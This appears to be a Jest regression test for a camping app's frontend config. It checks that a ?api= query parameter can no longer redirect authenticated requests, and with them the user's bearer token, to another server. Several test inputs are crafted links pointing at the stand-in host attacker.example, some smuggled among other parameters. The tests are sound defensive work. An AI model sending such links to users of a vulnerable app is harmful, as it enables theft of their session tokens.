// SECURITY REGRESSION GUARD: session-token exfiltration via ?api=.
//
// frontend/config.js sets window.API_URL, and app.js attaches the signed-in
// user's `Authorization: Bearer <token>` to every request sent there. The ?api=
// query parameter used to override that base URL on any host, so
//
//   https://mytrailpack.netlify.app/dashboard.html?api=https://attacker.example
//
// sent to a signed-in user pointed the app at an attacker's server and handed
// over their token on the first request. ?api= is now honoured on localhost
// only.
//
// This is a frontend file, but jest only runs from backend/, so the real
// config.js is executed here in a sandbox with a stubbed window/document rather
// than reimplemented — a copy of the logic would pass while the shipped file
// stayed vulnerable.
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const CONFIG_PATH = path.join(__dirname, '..', '..', 'frontend', 'config.js');
const SOURCE = fs.readFileSync(CONFIG_PATH, 'utf8');

// Pinned on purpose: the guard below is that ?api= cannot move window.API_URL
// off this value, which needs a literal to compare against. It is therefore a
// second copy of config.js's DEFAULT_PROD and has to change with it — the two
// went out of sync when the backend moved to a new Render URL, and this suite
// failed on dev until they matched again.
const PROD = 'https://trailpack-smart-camping-trip-planner-agq7.onrender.com';

function resolveConfig({ hostname, search = '', meta = null }) {
  const window = { location: { hostname, search } };
  const document = { querySelector: () => (meta ? { content: meta } : null) };
  const sandbox = { window, document, URLSearchParams };
  vm.createContext(sandbox);
  vm.runInContext(SOURCE, sandbox);
  return window;
}

function resolveApiUrl(opts) {
  return resolveConfig(opts).API_URL;
}

describe('?api= cannot redirect a deployed page', () => {
  test('THE EXPLOIT: ?api= is ignored on the production host', () => {
    const url = resolveApiUrl({
      hostname: 'mytrailpack.netlify.app',
      search: '?api=https://attacker.example',
    });

    // Old behaviour: window.API_URL became https://attacker.example, and the
    // next authenticated request delivered the token there.
    expect(url).toBe(PROD);
    expect(url).not.toMatch(/attacker/);
  });

  test('ignored on a Netlify deploy preview subdomain too', () => {
    const url = resolveApiUrl({
      hostname: 'deploy-preview-12--mytrailpack.netlify.app',
      search: '?api=https://attacker.example',
    });
    expect(url).toBe(PROD);
  });

  test('ignored when smuggled among other query parameters', () => {
    const url = resolveApiUrl({
      hostname: 'mytrailpack.netlify.app',
      search: '?tripId=abc&api=https://attacker.example&view=list',
    });
    expect(url).toBe(PROD);
  });

  test('a protocol-relative value is ignored just the same', () => {
    const url = resolveApiUrl({
      hostname: 'mytrailpack.netlify.app',
      search: '?api=//attacker.example',
    });
    expect(url).toBe(PROD);
  });
});

describe('the legitimate paths still work', () => {
  test('production with no override points at the Render backend', () => {
    expect(resolveApiUrl({ hostname: 'mytrailpack.netlify.app' })).toBe(PROD);
  });

  test('localhost with no override points at the local backend', () => {
    expect(resolveApiUrl({ hostname: 'localhost' })).toBe('http://localhost:3000');
  });

  test('?api= still works on localhost, where it is a dev convenience', () => {
    expect(resolveApiUrl({ hostname: 'localhost', search: '?api=http://localhost:4000' }))
      .toBe('http://localhost:4000');
    expect(resolveApiUrl({ hostname: '127.0.0.1', search: '?api=http://localhost:4000' }))
      .toBe('http://localhost:4000');
  });

  test('the meta override still works in production', () => {
    // Setting this means editing the served HTML, which requires already
    // controlling the page — unlike a link someone can send you.
    expect(resolveApiUrl({ hostname: 'mytrailpack.netlify.app', meta: 'https://staging.example' }))
      .toBe('https://staging.example');
  });

  test('a file:// style empty hostname is still treated as local', () => {
    expect(resolveApiUrl({ hostname: '' })).toBe('http://localhost:3000');
  });
});

/* window.TRAILS_API_URL — which host answers /api/nearby-trails.
 *
 * The route lives on the Cloudflare Worker. The same frontend is also served
 * from Vercel as static files, where a relative /api/nearby-trails is a 404 and
 * Discover reported it to the user as "the trail service is busy" forever. */
describe('Discover points at whichever host actually has the route', () => {
  const WORKER = 'https://trailpack---smart-camping-trip-planner.shrey30patel.workers.dev';

  function resolveTrailsUrl(opts) {
    return resolveConfig(opts).TRAILS_API_URL;
  }

  test('THE BUG: a static host gets the Worker absolutely, not a relative 404', () => {
    expect(resolveTrailsUrl({ hostname: 'trailpack-smart-camping.vercel.app' })).toBe(WORKER);
  });

  test('any other future static host gets the same treatment', () => {
    expect(resolveTrailsUrl({ hostname: 'mytrailpack.netlify.app' })).toBe(WORKER);
  });

  test('the Worker itself stays same-origin, so the call needs no CORS', () => {
    expect(resolveTrailsUrl({ hostname: 'trailpack---smart-camping-trip-planner.shrey30patel.workers.dev' }))
      .toBe('');
  });

  test('a preview subdomain on workers.dev is same-origin too', () => {
    expect(resolveTrailsUrl({ hostname: 'staging.trailpack.workers.dev' })).toBe('');
  });

  test('localhost stays same-origin, where wrangler dev serves the route', () => {
    expect(resolveTrailsUrl({ hostname: 'localhost' })).toBe('');
    expect(resolveTrailsUrl({ hostname: '127.0.0.1' })).toBe('');
    expect(resolveTrailsUrl({ hostname: '' })).toBe('');
  });

  test('?api= cannot redirect trail search either', () => {
    // Distinct from API_URL: no session token is sent here, but a page that
    // could be pointed at an attacker's trail service could be fed arbitrary
    // trail names and coordinates to render.
    expect(resolveTrailsUrl({
      hostname: 'trailpack-smart-camping.vercel.app',
      search: '?api=https://attacker.example',
    })).toBe(WORKER);
  });
});
